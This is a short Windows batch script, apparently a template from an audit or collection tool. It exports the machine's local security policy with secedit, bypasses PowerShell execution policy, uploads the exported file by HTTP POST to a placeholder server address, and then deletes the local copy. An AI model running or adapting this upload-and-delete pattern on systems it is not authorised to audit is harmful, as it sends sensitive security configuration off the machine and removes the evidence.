@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "secedit /export /cfg C:\audit_secpol.cfg /quiet; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_secpol.cfg -Headers @{\"X-Filename\"=\"audit_secpol.cfg\"} -UseBasicParsing; rm C:\audit_secpol.cfg"
